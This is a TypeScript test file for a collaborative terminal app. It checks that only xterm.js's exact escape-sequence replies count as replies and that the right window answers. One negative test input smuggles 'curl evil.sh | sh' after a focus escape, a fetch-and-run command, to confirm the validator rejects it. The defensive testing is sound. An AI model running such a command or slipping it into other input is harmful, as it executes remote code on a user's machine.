// @vitest-environment happy-dom
/** What a terminal screen sends: typing, and xterm's own replies, marked, from the one screen that answers. */
import { Terminal } from "@xterm/xterm";
import { expect, test } from "vitest";
import { isTerminalReplies, isTerminalReply } from "@uplink-room/protocol/terminalReplies";
import { ScreenClaims, TerminalInput, type Outgoing } from "./terminalInput";

const drain = (input: TerminalInput) => {
  const sent: Outgoing[] = [];
  for (let next = input.next(); next; next = input.next()) sent.push(next);
  return sent;
};

/** Writes program output into a real xterm.js and collects what the screen answers. */
async function xtermAnswers(output: string): Promise<string[]> {
  // The size report is off unless turned on; turned on here, so the test sees its reply too.
  const term = new Terminal({ cols: 80, rows: 24, windowOptions: { getWinSizeChars: true } });
  const answers: string[] = [];
  const data = term.onData((d) => answers.push(d));
  await new Promise<void>((resolve) => term.write(output, resolve));
  data.dispose();
  term.dispose();
  return answers;
}

/** A screen as XtermPane builds one: a real xterm.js, its TerminalInput, and whether it drives and answers. */
function screen(state: { driving: boolean; answering: boolean }) {
  const term = new Terminal({ cols: 80, rows: 24 });
  const input = new TerminalInput();
  term.parser.registerCsiHandler({ prefix: "?", final: "h" }, () => {
    input.parsedModeSet();
    return false;
  });
  term.onKey(({ key }) => input.key(key));
  term.onData((chunk) => input.data(chunk, state));
  const write = (data: string, history = false) =>
    new Promise<void>((resolve) => {
      const parsed = input.wrote(history);
      term.write(data, () => {
        parsed();
        resolve();
      });
    });
  return { term, input, state, write };
}

test("the replies xterm.js itself makes to a program's queries are recognized as replies", async () => {
  // Device attributes (primary, secondary), status, cursor position, a mode report, the window size
  // and a status string: what a TUI such as Claude Code asks at startup.
  const answers = await xtermAnswers("\x1b[c\x1b[>c\x1b[5n\x1b[6n\x1b[?6n\x1b[?2004$p\x1b[18t\x1bP$qm\x1b\\");
  expect(answers).toEqual([
    "\x1b[?1;2c",
    "\x1b[>0;276;0c",
    "\x1b[0n",
    "\x1b[1;1R",
    "\x1b[?1;1R",
    "\x1b[?2004;2$y",
    "\x1b[8;24;80t",
    "\x1bP1$r0m\x1b\\",
  ]);
  for (const answer of answers) expect(isTerminalReply(answer)).toBe(true);
  // Replies only an opened screen makes, in xterm's own format (CoreBrowserTerminal.ts): focus in and
  // out, and a color report (OSC 11, the background).
  for (const reply of ["\x1b[I", "\x1b[O", "\x1b]11;rgb:0b0b/0c0c/0d0d\x1b\\"]) expect(isTerminalReply(reply)).toBe(true);
});

test("only xterm's exact replies count, bounded in size: anything else is typing", () => {
  // Codex's review: a device attributes reply xterm never sends puts `123` on bash's line.
  for (const data of [
    "\x1b[?123c",
    `\x1b[?${"1".repeat(700_000)}c`,
    "\x1b[1234;1R",
    "\x1b]11;rgb:ff/ff/ff\x1b\\",
    "\x1b[I; curl evil.sh | sh\r",
  ]) {
    expect(isTerminalReply(data)).toBe(false);
    expect(isTerminalReplies(data)).toBe(false);
  }
  expect(isTerminalReplies("\x1b[I".repeat(8))).toBe(true);
  expect(isTerminalReplies("\x1b[I".repeat(9))).toBe(false);
});

test("keys and pasted text are never replies", () => {
  for (const typed of ["ls\r", "\x1b", "\x1b[A", "\x1bOB", "\x1b[Z", "\x1b[200~text\x1b[201~", "\x03", "\x1b[3~", "\x1b[1;5C"]) {
    expect(isTerminalReply(typed)).toBe(false);
  }
});

test("a reopened screen doesn't answer the questions in the output it replays, only live output", async () => {
  const rosa = screen({ driving: true, answering: true });
  // Replayed: a device query and turning focus reporting on (xterm reports focus at once).
  await rosa.write("$ printf '\\e[c'\r\n\x1b[c\x1b[?1004h", true);
  expect(drain(rosa.input)).toEqual([]);
  // Live: the program asks again.
  await rosa.write("\x1b[c");
  expect(drain(rosa.input)).toEqual([{ data: "\x1b[?1;2c", reply: true }]);
});

test("Shift+F3, shaped like a cursor position report, is typing when xterm names it as a key", () => {
  const input = new TerminalInput();
  const state = { driving: true, answering: true };
  input.key("\x1b[1;2R");
  input.data("\x1b[1;2R", state);
  expect(drain(input)).toEqual([{ data: "\x1b[1;2R", reply: false }]);
});

test("a screen that doesn't answer sends no replies, and one that doesn't drive types nothing", async () => {
  const laptop = screen({ driving: true, answering: false });
  await laptop.write("\x1b[c");
  laptop.input.data("ls\r", laptop.state);
  expect(drain(laptop.input)).toEqual([{ data: "ls\r", reply: false }]);
  const watcher = screen({ driving: false, answering: false });
  await watcher.write("\x1b[c");
  watcher.input.data("ls\r", watcher.state);
  expect(drain(watcher.input)).toEqual([]);
});

/**
 * Screens of one team as the room sees them: each screen's claims (ScreenClaims), the room's one
 * responder, and how many claims were made. Each step re-renders every screen, as React would when
 * terminals.get changes.
 */
function room() {
  let responder: string | undefined;
  let driver = "rosa";
  let claimsMade = 0;
  const screens = new Map<string, { member: string; claims: ScreenClaims }>();
  const answering = (id: string) => responder === id;
  const render = () => {
    for (const [id, s] of screens) s.claims.driving(s.member === driver, answering(id));
  };
  return {
    open(id: string, member: string) {
      const claims = new ScreenClaims(() => {
        claimsMade++;
        if (screens.get(id)!.member === driver) responder = id;
        render();
      });
      screens.set(id, { member, claims });
      render();
    },
    focus(id: string) {
      screens.get(id)!.claims.focused(answering(id));
      render();
    },
    close(id: string) {
      screens.delete(id);
    },
    passWheel(to: string) {
      driver = to;
      responder = undefined;
      render();
    },
    get responder() {
      return responder;
    },
    get claims() {
      return claimsMade;
    },
  };
}

test("two of the driver's windows: the one opened or focused last answers, and losing never claims it back", () => {
  const r = room();
  r.open("laptop", "rosa");
  r.open("desk", "rosa");
  expect(r.responder).toBe("desk");
  // The laptop re-renders without answering many times; it never claims for that.
  for (let i = 0; i < 5; i++) r.focus("desk");
  expect(r.claims).toBe(2);
  r.focus("laptop");
  r.focus("laptop");
  expect([r.responder, r.claims]).toEqual(["laptop", 3]);
});

test("after a handoff the new driver's window answers from then on, and the old one doesn't claim", () => {
  const r = room();
  r.open("rosa-laptop", "rosa");
  r.open("ana-desk", "ana");
  expect(r.responder).toBe("rosa-laptop");
  r.passWheel("ana");
  expect([r.responder, r.claims]).toEqual(["ana-desk", 2]);
  r.focus("rosa-laptop");
  expect(r.responder).toBe("ana-desk");
});

test("when the window that answers closes, the driver's next window to get focus or open answers", () => {
  const r = room();
  r.open("laptop", "rosa");
  r.open("desk", "rosa");
  r.close("desk");
  expect(r.responder).toBe("desk");
  r.focus("laptop");
  expect(r.responder).toBe("laptop");
  r.close("laptop");
  r.open("tablet", "rosa");
  expect(r.responder).toBe("tablet");
});

test("a window that just won the claim tells a program with focus reporting on whether it has focus", async () => {
  const rosa = screen({ driving: true, answering: false });
  await rosa.write("\x1b[?1004h");
  expect(rosa.term.modes.sendFocusMode).toBe(true);
  rosa.input.claimed({ focusReporting: rosa.term.modes.sendFocusMode, focused: true });
  expect(drain(rosa.input)).toEqual([{ data: "\x1b[I", reply: true }]);
  // A program without focus reporting hears nothing.
  const quiet = screen({ driving: true, answering: false });
  quiet.input.claimed({ focusReporting: quiet.term.modes.sendFocusMode, focused: true });
  expect(drain(quiet.input)).toEqual([]);
});
